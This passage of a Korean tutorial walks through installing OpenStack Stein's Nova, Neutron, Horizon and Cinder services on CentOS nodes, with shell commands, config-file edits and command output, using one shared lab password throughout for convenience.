6820b49138d54b63ac34cd52f1be08f6 | RegionOne | placement | placement | True | internal | http://10.10.10.10:8778 | | 6ad740445fca4a0fb684d913909fe129 | RegionOne | nova | compute | True | admin | http://10.10.10.10:8774/v2.1/%(tenant_id)s | | 9863826e093943cf97a05dfc6e3c159a | RegionOne | nova | compute | True | internal | http://10.10.10.10:8774/v2.1/%(tenant_id)s | | b9f9701a57ec40e487ce493a63903cae | RegionOne | placement | placement | True | admin | http://10.10.10.10:8778 | | bd787b85b3124f0ab15854998624cb19 | RegionOne | nova | compute | True | public | http://10.10.10.10:8774/v2.1/%(tenant_id)s | | bdd7df7c8cba46f6ada2c12155a9f1d6 | RegionOne | keystone | identity | True | internal | http://10.10.10.10:5000/v3/ | | d394eaf13ac840b3b2e69e074c2c1c20 | RegionOne | glance | image | True | admin | http://10.10.10.10:9292 | +----------------------------------+-----------+--------------+--------------+---------+-----------+--------------------------------------------+   Nova DB 생성  $ mysql -u root -p MariaDB [(none)]\u0026gt; create database nova; MariaDB [(none)]\u0026gt; grant all privileges on nova.* to nova@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; grant all privileges on nova.* to nova@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; create database nova_api; MariaDB [(none)]\u0026gt; grant all privileges on nova_api.* to nova@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; grant all privileges on nova_api.* to nova@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; create database nova_placement; MariaDB [(none)]\u0026gt; grant all privileges on nova_placement.* to nova@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; grant all privileges on nova_placement.* to nova@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; create database nova_cell0; MariaDB [(none)]\u0026gt; grant all privileges on nova_cell0.* to nova@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; grant all privileges on nova_cell0.* to nova@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; flush privileges; # nova 구성을 위한 db를 생성합니다. ( 저는 편의를 위해 모든 pw로 qwer1234 설정하였습니다. )   nova 서비스를 설치 및 수정합니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-nova # nova 패키지를 설치합니다. $ vi /etc/nova/nova.conf [DEFAULT] my_ip = 10.10.10.10 state_path = /var/lib/nova enabled_apis = osapi_compute,metadata log_dir = /var/log/nova [api] auth_strategy = keystone [glance] api_servers = http://controller:9292 [oslo_concurrency] lock_path = $state_path/tmp [api_database] connection = mysql+pymysql://nova:qwer1234@controller/nova_api [database] connection = mysql+pymysql://nova:qwer1234@controller/nova [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = nova password = qwer1234 [placement] auth_url = http://controller:5000 os_region_name = RegionOne auth_type = password project_domain_name = default user_domain_name = default project_name = service username = placement password = qwer1234 [placement_database] connection = mysql+pymysql://nova:qwer1234@controller/nova_placement [wsgi] api_paste_config = /etc/nova/api-paste.ini # nova의 설정 파일을 수정합니다.   Selinux 및 firewalld을 설정합니다.  $ yum --enablerepo=centos-openstack-stein -y install openstack-selinux $ semanage port -a -t http_port_t -p tcp 8778 $ firewall-cmd --add-port={6080/tcp,6081/tcp,6082/tcp,8774/tcp,8775/tcp,8778/tcp} --permanent $ firewall-cmd --reload   nova 서비스를 DB에 저장합니다.  $ su -s /bin/bash nova -c \u0026#34;nova-manage api_db sync\u0026#34; $ su -s /bin/bash nova -c \u0026#34;nova-manage cell_v2 map_cell0\u0026#34; $ su -s /bin/bash nova -c \u0026#34;nova-manage db sync\u0026#34; $ su -s /bin/bash nova -c \u0026#34;nova-manage cell_v2 create_cell --name cell1\u0026#34;   nova 서비스를 시작 및 자동시작을 설정합니다.  $ systemctl restart httpd $ chown nova. /var/log/nova/nova-placement-api.log $ for service in api consoleauth conductor scheduler novncproxy; do systemctl start openstack-nova-$service systemctl enable openstack-nova-$service done  이상으로 controller 노드에서의 구성을 마치겠습니다. 하단부터의 패키지 설치는 compute노드에서 진행해주세요      Stein 레포지터리를 활성화합니다.  $ yum -y install centos-release-openstack-stein $ sed -i -e \u0026#34;s/enabled=1/enabled=0/g\u0026#34; /etc/yum.repos.d/CentOS-OpenStack-stein.repo # stein 패캐지를 등록합니다.   KVM 하이퍼바이저를 구성합니다.  $ yum -y install qemu-kvm libvirt virt-install bridge-utils # KVM 구성에 필요한 가상화 및 네트워크 도구들을 설치합니다. $ lsmod | grep kvm # 확인 $ systemctl start libvirtd $ systenctk ebable libvirtd   compute 노드에 nova 서비스를 설치 및 수정합니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-nova # nova 패키지를 설치합니다. $ vi /etc/nova/nova.conf [DEFAULT] my_ip = 10.10.10.30 state_path = /var/lib/nova enabled_apis = osapi_compute,metadata log_dir = /var/log/nova transport_url = rabbit://openstack:qwer1234@controller [api] auth_strategy = keystone [vnc] enabled = True server_listen = 0.0.0.0 server_proxyclient_address = 192.168.10.102 novncproxy_base_url = http://192.168.10.102/vnc_auto.html # vnc 화면으르 활성화 합니다. 추후 오픈스택 대시보드 혹은 vnc 클라이언트 프로그램으로 접속할 때 사용합니다. [glance] api_servers = http://controller:9292 [oslo_concurrency] lock_path = $state_path/tmp [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = nova password = qwer1234 [placement] auth_url = http://controller:5000 os_region_name = RegionOne auth_type = password project_domain_name = default user_domain_name = default project_name = service username = placement password = qwer1234 [wsgi] api_paste_config = /etc/nova/api-paste.ini # nova의 설정 파일을 수정합니다.   Selinux 및 firewall 설정  $ yum --enablerepo=centos-openstack-stein -y install openstack-selinux $ firewall-cmd --add-port=5900-5999/tcp --permanent $ firewall-cmd --reload   nova 서비스 시작  $ systemctl start openstack-nova-compute $ systemctl enable openstack-nova-compute \u0026amp; controller# openstack compute service list # 확인 +----+------------------+------------+----------+---------+-------+----------------------------+ | ID | Binary | Host | Zone | Status | State | Updated At | +----+------------------+------------+----------+---------+-------+----------------------------+ | 4 | nova-consoleauth | controller | internal | enabled | up | 2020-07-19T02:47:16.000000 | | 5 | nova-conductor | controller | internal | enabled | up | 2020-07-19T02:47:12.000000 | | 8 | nova-scheduler | controller | internal | enabled | up | 2020-07-19T02:47:12.000000 | | 9 | nova-compute | compute | nova | enabled | up | 2020-07-19T02:47:08.000000 | +----+------------------+------------+----------+---------+-------+----------------------------+    6. Neutron ( 네트워크 서비스 ) 구성   Neutron 서비스르르 구성하는 과정에서는 모든 노드에 설치가 진행됩니다. 기본적으로 openvswithch를 중심으로 진행하며, 경우에 따라서는 linuxbridge로 서비스를 대체하는 것이 가능합니다. 설치 과정은 controller, compute, network 노드 순으로 진행하겠습니다. Neutron에 대한 설명은 Neutron을 참조해주세요.    Neutron 사용자 추가  $ openstack user create --domain default --project service --password qwer1234 neutron $ openstack role add --project service --user neutron admin $ openstack service create --name neutron --description \u0026#34;OpenStack Networking service\u0026#34; network # Netutron 사용자를 추가 및 서비스를 등록합니다. $ export controller=10.10.10.10 $ openstack endpoint create --region RegionOne network public http://$controller:9696 $ openstack endpoint create --region RegionOne network internal http://$controller:9696 $ openstack endpoint create --region RegionOne network admin http://$controller:9696 # neutron의 endpoint를 생성합니다.   Neutron DB 생성  $ mysql -u root -p MariaDB [(none)]\u0026gt; create database neutron_ml2; MariaDB [(none)]\u0026gt; grant all privileges on neutron_ml2.* to neutron@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; grant all privileges on neutron_ml2.* to neutron@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; flush privileges; # neutron 구성을 위한 db를 생성합니다. ( 저는 편의를 위해 모든 pw로 qwer1234 설정하였습니다. )   Neutron 설치 및 설정  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-neutron openstack-neutron-ml2 # neutron 패키지 설치 $ vi /etc/neutron/neutron.conf [DEFAULT] core_plugin = ml2 service_plugins = router auth_strategy = keystone stae_path = /var/lib/neutron dhcp_agent_notification = True allow_overlapping_ips = True notify_nova_on_port_status_changes = True notify_nova_on_port_data_changes = True transport_url = rabbit://openstack:qwer1234@controller [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = neutron password = qwer1234 [database] connection = mysql+pymysql://neutron:qwer1234@controller/neutron_ml2 [nova] auth_url = http://controller:5000 auth_type = password project_domain_name = default user_domain_name = default region_name = RegionOne project_name = service username = nova password = qwer1234 [oslo_concurrency] lock_path = $state_path/tmp $ vi /etc/neutron/metadata_agent.ini [DEFAULT] nova_metadata_host = controller metadata_proxy_shared_secret = metadata_secret memcache_servers = controller:11211 # metadata_agent.ini 파일을 수정합니다. $ vi /etc/neutron/plugins/ml2/ml2_conf.ini [ml2] type_drivers = flat,vlan,gre,vxlan tenant_network_types = mechanism_drivers = openvswitch extension_drivers = port_security # ml2_conf.ini 파일에 설정을 수정합니다.   이어 nova.conf 파일에 설정을 추가합니다.  $ vi /etc/nova/nova.conf [DEFAULT] ... use_neutron = True linuxnet_interface_driver = nova.network.linux_net.LinuxOVSInterfaceDriver firewall_driver = nova.virt.firewall.NoopFirewallDriver [neutron] auth_url = http://controller:5000 auth_type = password project_domain_name = default user_domain_name = default region_name = RegionOne project_name = service username = neutron password = qwer1234 service_metadata_proxy = True metadata_proxy_shared_secret = metadata_secret   Selinux 및 방화벽 설정  $ yum --enablerepo=centos-openstack-stein -y install openstack-selinux $ setsebool -P neutron_can_network on $ setsebool -P daemons_enable_cluster_mode on $ firewall-cmd --add-port=9696/tcp --permanent $ firewall-cmd --reload # Selinux 및 방화벽을 설정합니다.   Neutron DB를 생성 및 서비스를 시작합니다.  $ ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini $ su -s /bin/bash neutron -c \u0026#34;neutron-db-manage --config-file /etc/neutron/neutron.conf --config-file /etc/neutron/plugin.ini upgrade head\u0026#34; # Neutron DB를 생성합니다. $ systemctl start neutron-server neutron-metadata-agent $ systemctl enable neutron-server neutron-metadata-agent $ systemctl restart openstack-nova-api     이제 다음으로는 network 노드에 구현해보도록 하겠습니다.  $ yum -y install centos-release-openstack-stein $ sed -i -e \u0026#34;s/enabled=1/enabled=0/g\u0026#34; /etc/yum.repos.d/CentOS-OpenStack-stein.repo # stein 패캐지를 등록합니다. $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch libibverbs # neutron 패키지를 설치합니다.   neutron 설정합니다.  $ vi /etc/neutron/neutron.conf [DEFAULT] core_plugin = ml2 service_plugins = router auth_strategy = keystone stae_path = /var/lib/neutron allow_overlapping_ips = True transport_url = rabbit://openstack:qwer1234@controller [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = neutron password = qwer1234 [oslo_concurrency] lock_path = $state_path/tmp $ vi /etc/neutron/l3_agent.ini [DEFAULT] ... interface_driver = openvswitch # l3_agent.ini 파일을 수정합니다. $ vi /etc/neutron/dhcp_agent.ini [DEFAULT] ... interface_driver = openvswitch dhcp_driver = neutron.agent.linux.dhcp.Dnsmasq enable_isolated_metadata = true # dhcp_agent.ini 파일을 수정합니다. $ vi /etc/neutron/metadata_agent.ini [DEFAULT] nova_metadata_host = controller metadata_proxy_shared_secret = metadata_secret # metadata_agent.ini 파일을 수정합니다. $ vi /etc/neutron/plugins/ml2/ml2_conf.ini [ml2] type_drivers = flat,vlan,gre,vxlan tenant_network_types = mechanism_drivers = openvswitch extension_drivers = port_security # ml2_conf.ini 파일에 설정을 수정합니다. $ vi /etc/neutron/plugins/ml2/openvswitch_agent.ini [securitygroup] firewall_driver = openvswitch enable_security_group = true enable_ipset = true # openvswitch_agent.ini 파일의 하단에 추가합니다.   Selinux 및 방화벽 설정  $ yum --enablerepo=centos-openstack-stein -y install openstack-selinux $ setsebool -P neutron_can_network on $ setsebool -P haproxy_connect_any on $ setsebool -P daemons_enable_cluster_mode on $ vi my-ovsofctl.te # create new module my-ovsofctl 1.0; require { type neutron_t; class capability sys_rawio; } #============= neutron_t ============== allow neutron_t self:capability sys_rawio; $ checkmodule -m -M -o my-ovsofctl.mod my-ovsofctl.te $ semodule_package --outfile my-ovsofctl.pp --module my-ovsofctl.mod $ semodule -i my-ovsofctl.pp # Selinux 및 방화벽을 추가설정합니다.   시스템을 재시작 합니다.  $ ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini $ systemctl start openvswitch $ systemctl enable openvswitch $ ovs-vsctl add-br br-int $ systemctl restart openstack-nova-compute $ systemctl start neutron-openvswitch-agent $ systemctl enable neutron-openvswitch-agent   이어서 compute 노드에서의 설정을 진행하겠습니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch # neutron 패키지를 설치합니다.   neutron 설정합니다.  $ vi /etc/neutron/neutron.conf [DEFAULT] core_plugin = ml2 service_plugins = router auth_strategy = keystone stae_path = /var/lib/neutron allow_overlapping_ips = True transport_url = rabbit://openstack:qwer1234@controller [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = neutron password = qwer1234 [oslo_concurrency] lock_path = $state_path/tmp $ vi /etc/neutron/plugins/ml2/ml2_conf.ini [ml2] type_drivers = flat,vlan,gre,vxlan tenant_network_types = mechanism_drivers = openvswitch extension_drivers = port_security # ml2_conf.ini 파일에 설정을 수정합니다. $ vi /etc/neutron/plugins/ml2/openvswitch_agent.ini [securitygroup] firewall_driver = openvswitch enable_security_group = true enable_ipset = true # openvswitch_agent.ini 파일의 하단에 추가합니다.   이어서 Nova.conf 파일을 수정합니다.  $ vi /etc/nova/nova.conf [DEFAULT] ... use_neutron = True linuxnet_interface_driver = nova.network.linux_net.LinuxOVSInterfaceDriver firewall_driver = nova.virt.firewall.NoopFirewallDriver vif_plugging_is_fatal = True vif_plugging_timeout = 300 [neutron] auth_url = http://controller:5000 auth_type = password project_domain_name = default user_domain_name = default region_name = RegionOne project_name = service username = neutron password = qwer1234 service_metadata_proxy = True metadata_proxy_shared_secret = metadata_secret   Selinux 및 방화벽 설정  $ yum --enablerepo=centos-openstack-stein -y install openstack-selinux $ setsebool -P neutron_can_network on $ setsebool -P haproxy_connect_any on $ setsebool -P daemons_enable_cluster_mode on $ vi my-ovsofctl.te # create new module my-ovsofctl 1.0; require { type neutron_t; class capability sys_rawio; } #============= neutron_t ============== allow neutron_t self:capability sys_rawio; $ checkmodule -m -M -o my-ovsofctl.mod my-ovsofctl.te $ semodule_package --outfile my-ovsofctl.pp --module my-ovsofctl.mod $ semodule -i my-ovsofctl.pp # Selinux 및 방화벽을 추가설정합니다.   시스템을 재시작 합니다.  $ ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini $ systemctl start openvswitch $ systemctl enable openvswitch $ ovs-vsctl add-br br-int $ for service in dhcp-agent l3-agent metadata-agent openvswitch-agent; do systemctl start neutron-$service systemctl enable neutron-$service done     이제 이어 compute 노드에서 neutron 서비스를 설치하도록 하겠습니다.  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-neutron openstack-neutron-ml2 openstack-neutron-openvswitch # neutron 서비스를 설치합니다. $ vi /etc/neutron/neutron.conf [DEFAULT] core_plugin = ml2 service_plugins = router auth_strategy = keystone stae_path = /var/lib/neutron allow_overlapping_ips = True transport_url = rabbit://openstack:qwer1234@controller [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = neutron password = qwer1234 [oslo_concurrency] lock_path = $state_path/tmp $ vi /etc/neutron/plugins/ml2/ml2_conf.ini [ml2] type_drivers = flat,vlan,gre,vxlan tenant_network_types = mechanism_drivers = openvswitch extension_drivers = port_security $ vi /etc/neutron/plugins/ml2/openvswitch_agent.ini [securitygroup] firewall_driver = openvswitch enable_security_group = true enable_ipset = true   이어서 nova.conf 파일을 수정합니다.  $ vi /etc/nova/nova.conf [DEFAULT] ... use_neutron = True linuxnet_interface_driver = nova.network.linux_net.LinuxOVSInterfaceDriver firewall_driver = nova.virt.firewall.NoopFirewallDriver vif_plugging_is_fatal = True vif_plugging_timeout = 300 [neutron] auth_url = http://controller:5000 auth_type = password project_domain_name = default user_domain_name = default region_name = RegionOne project_name = service username = neutron password = qwer1234 service_metadata_proxy = True metadata_proxy_shared_secret = metadata_secret   Selinux 및 방화벽 설정  $ yum --enablerepo=centos-openstack-stein -y install openstack-selinux $ setsebool -P neutron_can_network on $ setsebool -P haproxy_connect_any on $ setsebool -P daemons_enable_cluster_mode on $ vi my-ovsofctl.te # create new module my-ovsofctl 1.0; require { type neutron_t; class capability sys_rawio; } #============= neutron_t ============== allow neutron_t self:capability sys_rawio; $ checkmodule -m -M -o my-ovsofctl.mod my-ovsofctl.te $ semodule_package --outfile my-ovsofctl.pp --module my-ovsofctl.mod $ semodule -i my-ovsofctl.pp # Selinux 및 방화벽을 추가설정합니다.   서비스를 재시작 및 등록합니다.  $ ln -s /etc/neutron/plugins/ml2/ml2_conf.ini /etc/neutron/plugin.ini $ systemctl start openvswitch $ systemctl enable openvswitch $ ovs-vsctl add-br br-int $ systemctl restart openstack-nova-compute $ systemctl start neutron-openvswitch-agent $ systemctl enable neutron-openvswitch-agent     이제 다음으로는 본격적으로 neutron 네트워크를 구현해보도록 하겠습니다. 먼저 controller 노드에서 ml2_conf 파일을 수정 및 추가합니다. 위에서 tenant 타입을 비워둔 이유는, 타입에 따라 사용하는 네트워크 구조가 달라지기 때문입니다. 여기서는 vxlan을 사용해 구성해보도록 하겠습니다.  $ vi /etc/neutron/plugins/ml2/ml2_conf.ini [ml2] tenant_network_types = vxlan [ml2_type_flat] flat_networks = physnet1 [ml2_type_vxlan] vni_ranges = 1:1000 # ml2.conf 파일을 수정합니다 $ systemctl restart neutron-server # neutron 서비스를 재시작 합니다.   이제 Network 노드에서의 설치를 진행해보도록 하겠습니다.   $ ovs-vsctl add-br br-eth1 $ ovs-vsctl add-port br-eth1 ens33 # 네트워크 브릿지를 생성하고, 네트워크 노드의 외부대역의 인터페이스 번호를 바인딩합니다.   neutron 서비스 사용을 위한 설정을 진행합니다.  $ vi /etc/neutron/plugins/ml2/ml2_conf.ini [ml2] type_drivers = flat,vlan,gre,vxlan tenant_network_types = vxlan mechanism_drivers = openvswitch extension_drivers = port_security [ml2_type_flat] flat_networks = physnet1 [ml2_type_vxlan] vni_ranges = 1:1000 # ml2_conf.ini 파일에 설정을 추가 설정합니다. $ vi /etc/neutron/plugins/ml2/openvswitch_agent.ini [agent] tunnel_type = vxlan prevent_arp_spoofing = True [ovs] local_ip = 10.10.10.20 bridge_mappings = physnet1:br-eth1 # openvswitch_agent.ini 파일의 하단에 추가합니다. $ for service in dhcp-agent l3-agent metadata-agent openvswitch-agent; do systemctl restart neutron-$service done # neutron 서비스를 재시작합니다. $ systemctl stop firewalld $ systemctl disable firewalld # 방화벽을 해제합니다.   바인딩 오류를 해결하기 위해 설정을 진행합니다.  $ vi /etc/sysconfig/network-scripts/ifcfg-ens33 TYPE=Ethernet BOOTPROTO=static DEFROUTE=yes NAME=ens33 DEVICE=ens33 ONBOOT=yes $ vi /var/tmp/create_interface.sh #!/bin/bash ip link set up br-eth1 ip addr add 192.168.10.101/24 dev br-eth1 route add default gw 192.168.10.2 dev br-eth1 echo \u0026#34;nameserver 8.8.8.8\u0026#34; \u0026gt; /etc/resolv.conf $ chmod 755 /var/tmp/create_interface.sh $ vi /etc/systemd/system/set_interface.service [Unit] Description=Description for sample script goes here After=network.target [Service] Type=simple ExecStart=/var/tmp/create_interface.sh TimeoutStartSec=0 [Install] WantedBy=default.target $ systemctl enable set_interface $ init 6   이어 compute 노드에서의 설정을 진행합니다.  $ vi /etc/neutron/plugins/ml2/ml2_conf.ini [ml2] type_drivers = flat,vlan,gre,vxlan tenant_network_types = vxlan mechanism_drivers = openvswitch extension_drivers = port_security [ml2_type_flat] flat_networks = physnet1 [ml2_type_vxlan] vni_ranges = 1:1000 # ml2_conf.ini 파일에 설정을 추가 설정합니다. $ vi /etc/neutron/plugins/ml2/openvswitch_agent.ini [agent] tunnel_type = vxlan prevent_arp_spoofing = True [ovs] local_ip = 10.10.10.30 # openvswitch_agent.ini 파일의 하단에 추가합니다. $ for service in dhcp-agent l3-agent metadata-agent openvswitch-agent; do systemctl restart neutron-$service done # neutron 서비스를 재시작합니다. $ systemctl stop firewalld $ systemctl disable firewalld # 방화벽을 해제합니다.   확인  $ openstack network agent list +--------------------------------------+--------------------+------------+-------------------+-------+-------+---------------------------+ | ID | Agent Type | Host | Availability Zone | Alive | State | Binary | +--------------------------------------+--------------------+------------+-------------------+-------+-------+---------------------------+ | 261bbd8f-ece9-4818-91c3-be75b928fa54 | Open vSwitch agent | network | None | :-) | UP | neutron-openvswitch-agent | | 26376b7b-e4d0-413c-85b9-521994c41bf6 | Open vSwitch agent | compute | None | :-) | UP | neutron-openvswitch-agent | | 8b520189-c500-47ec-b330-b84bc0a3b622 | Metadata agent | controller | None | :-) | UP | neutron-metadata-agent | | ba443e32-a931-465f-acff-05621dac0424 | Metadata agent | network | None | :-) | UP | neutron-metadata-agent | | be878ec2-b8c9-4923-8d01-111d7c11c8f1 | L3 agent | network | nova | :-) | UP | neutron-l3-agent | | cb74c09d-7ec5-4457-a384-8303235adc97 | DHCP agent | network | nova | :-) | UP | neutron-dhcp-agent | +--------------------------------------+--------------------+------------+-------------------+-------+-------+---------------------------+ $ openstack router create router01 $ openstack network create int --provider-network-type vxlan $ openstack subnet create int_sub --network int \\ --subnet-range 1.1.1.0/24 --gateway 1.1.1.2 \\ --dns-nameserver 8.8.8.8 # 라우터와 내부대역을 생성합니다. $ openstack router add subnet router01 int_sub # 라우터와 내부대벽을 연결시킵니다. $ openstack network create \\ --provider-physical-network physnet1 \\ --provider-network-type flat --external ext $ openstack subnet create subnet2 \\ --network ext_net --subnet-range 192.168.10.0/24 \\ --allocation-pool start=192.168.10.150,end=192.168.10.200 \\ --gateway 192.168.10.2 --dns-nameserver 8.8.8.8 # 외부대역을 생성합니다. 외부대역의 IP는 바인딩한 br-eth1의 IP 대역과 동일해야합니다. $ openstack router set router01 --external-gateway ext # 생성한 라우터의 게이트웨이를 생성한 외부대역에 바운딩시킵니다. $ openstack network list +--------------------------------------+------+--------------------------------------+ | ID | Name | Subnets | +--------------------------------------+------+--------------------------------------+ | 2875f833-2d46-4740-bdd4-09c75c53e2b1 | int | 698d35ae-8d7c-436f-be1b-fcf4319eb5fe | | 4a25933d-ed21-4a5c-a87b-4e782e93c14c | ext | 47b0ee11-b628-4260-9185-71d1dab401ea | +--------------------------------------+------+--------------------------------------+ $ openstack subnet list +--------------------------------------+---------+--------------------------------------+-----------------+ | ID | Name | Network | Subnet | +--------------------------------------+---------+--------------------------------------+-----------------+ | 47b0ee11-b628-4260-9185-71d1dab401ea | ext-sub | 4a25933d-ed21-4a5c-a87b-4e782e93c14c | 192.168.10.0/24 | | 698d35ae-8d7c-436f-be1b-fcf4319eb5fe | int-sub | 2875f833-2d46-4740-bdd4-09c75c53e2b1 | 1.1.1.0/24 | +--------------------------------------+---------+--------------------------------------+-----------------+ $ wget http://cloud-images.ubuntu.com/releases/18.04/release/ubuntu-18.04-server-cloudimg-amd64.img -P /var/kvm/images $ openstack image create \u0026#34;Ubuntu1804\u0026#34; --file /var/kvm/images/ubuntu-18.04-server-cloudimg-amd64.img --disk-format qcow2 --container-format bare --public # 이미지를 다운로드 및 등록합니다. $ openstack flavor create --ram 1024 --disk 10 --vcpus 1 m1.small # flavor를 생성합니다. $ ssh-keygen -q -N \u0026#34;\u0026#34; $ openstack keypair create --public-key ~/.ssh/id_rsa.pub mykey # keypair를 생성합니다. $ openstack floating ip create ext # floating ip를 생성합니다. $ openstack create server --image Ubuntu1804 --flavor m1.small --key mykey --network int Ubuntu $ openstack server add floating ip Ubuntu 192.168.10.170 # 인스턴스를 생성하고 floating ip를 추가합니다. $ openstack server list +--------------------------------------+--------+--------+-------------------------------+------------+----------+ | ID | Name | Status | Networks | Image | Flavor | +--------------------------------------+--------+--------+-------------------------------+------------+----------+ | 75fa0186-ab63-4aaa-a27c-3f2126e5d31d | Ubuntu | ACTIVE | int=1.1.1.248, 192.168.10.170 | Ubuntu1804 | m1.small | +--------------------------------------+--------+--------+-------------------------------+------------+----------+ $ openstack security group create open $ openstack security group rule create --protocol icmp --ingress open $ openstack security group rule create --protocol tcp --dst-port 22:22 open $ openstack security group rule create --protocol tcp --dst-port 80:80 open $ openstack server add security group Ubuntu open # 보안그룹을 생성하고 적용시킵니다. $ ssh ubuntu@192.168.10.170 $ ping 8.8.8.8 $ sudo apt -y install apache2 $ sudo service apache2 start # 본체 Host에서 접속해서 확인  이것으로 기본적인 openstack-stein 버전의 설치를 완료하였습니다.     7. Horizon ( 대시보드 서비스 ) 구성   Horizon은 controller 노드에서 설치가 진행됩니다. 에 대한 설명은 Horizone을 참조해주세요.    Horizon 패키지 설치  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-dashboard # Horizon 패키지를 설치합니다.   대시보드를 설정합니다.  $ vi /etc/openstack-dashboard/local_settings ALLOWED_HOSTS = [\u0026#39;*\u0026#39;] # 수정 OPENSTACK_API_VERSIONS = { \u0026#34;identity\u0026#34;: 3, \u0026#34;image\u0026#34;: 3, \u0026#34;volume\u0026#34;: 3, \u0026#34;compute\u0026#34;: 2, } # 주석 제거 및 수정 OPENSTACK_KEYSTONE_MULTIDOMAIN_SUPPORT = True # 주석 해제 및 수정 OPENSTACK_KEYSTONE_DEFAULT_DOMAIN = \u0026#39;Default\u0026#39; # 주석 제거 CACHES = { \u0026#39;default\u0026#39;: { \u0026#39;BACKEND\u0026#39;: \u0026#39;django.core.cache.backends.memcached.MemcachedCache\u0026#39;, \u0026#39;LOCATION\u0026#39;: \u0026#39;127.0.0.1:11211\u0026#39;, }, } # 주석제거 OPENSTACK_HOST = \u0026#34;controller\u0026#34; # IP 변경 OPENSTACK_KEYSTONE_DEFAULT_ROLE = \u0026#34;member\u0026#34; # 수정 $ vi /etc/httpd/conf.d/openstack-dashboard.conf WSGIDaemonProcess dashboard WSGIProcessGroup dashboard WSGISocketPrefix run/wsgi WSGIApplicationGroup %{GLOBAL} # 추가   Selinux 및 방화벽 설정  $ setsebool -P httpd_can_network_connect on $ firewall-cmd --add-service={http,https} --permanent $ firewall-cmd --reload $ systemctl restart httpd   ** DB 생성**  $ mysql -u root -p MariaDB [(none)]\u0026gt; create database keystone; MariaDB [(none)]\u0026gt; grant all privileges on .* to @\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; grant all privileges on .* to @\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; flush privileges; # 구성을 위한 db를 생성합니다. ( 저는 편의를 위해 모든 pw로 qwer1234 설정하였습니다. )    8. Cinder ( 오브젝트 스토리지 및 블록 스토리지 구성 )   Cinder는 기본적으로 독립적으로 storage 노드를 구성하거나 혹은 compute 노드에 추가하여 사용합니다. 여기서는 compute 노드에 포함하여 구성하도록 하겠습니다/ 구성 순서는 controller \u0026gt; compute 노드 순으로 진행하겠습니다. Cinder에 대한 설명은 Cinder을 참조해주세요.    Cinder 서비스 등록  $ source ~/admin $ openstack user create --domain default --project service --password qwer1234 cinder $ openstack role add --project service --user cinder admin $ openstack service create --name cinderv3 --description \u0026#34;OpenStack Block service\u0026#34; volumev3 # cinder 사용자를 추가 및 서비스를 등록합니다. $ export controller=10.10.10.10 $ openstack endpoint create --region RegionOne volumev3 public http://$controller:8776/v3/%\\(tenant_id\\)s $ openstack endpoint create --region RegionOne volumev3 internal http://$controller:8776/v3/%\\(tenant_id\\)s $ openstack endpoint create --region RegionOne volumev3 admin http://$controller:8776/v3/%\\(tenant_id\\)s # cinder의 endpoint를 생성합니다.   Cinder DB 생성  $ mysql -u root -p MariaDB [(none)]\u0026gt; create database cinder; MariaDB [(none)]\u0026gt; grant all privileges on cinder.* to cinder@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; grant all privileges on cinder.* to cinder@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; flush privileges; # cinder 구성을 위한 db를 생성합니다. ( 저는 편의를 위해 모든 pw로 qwer1234 설정하였습니다. )   cinder 패키지 설치 및 수정  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-cinder $ vi /etc/cinder/cinder.conf [DEFAULT] my_ip = 10.10.10.10 log_dir = /var/log/cinder state_path = /var/lib/cinder auth_strategy = keystone transport_url = rabbit://openstack:qwer1234@controller enable_v3_api = True [keystone_authtoken] www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default 